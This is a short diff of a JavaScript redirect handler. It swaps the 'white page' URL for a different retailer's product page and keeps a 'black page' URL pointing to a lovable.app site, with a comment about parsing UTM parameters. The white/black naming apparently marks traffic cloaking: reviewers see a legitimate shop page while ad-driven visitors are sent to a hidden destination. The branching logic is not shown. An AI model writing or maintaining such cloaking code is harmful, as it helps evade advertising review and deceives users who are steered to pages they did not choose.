@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://zippyonline.com/products/zy-superlight-runner-combined-trainers-for-boys-green-blue";
+    const whitePageURL = "https://www.nextdirect.com/dk/en/style/su406826/e53225";
     const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
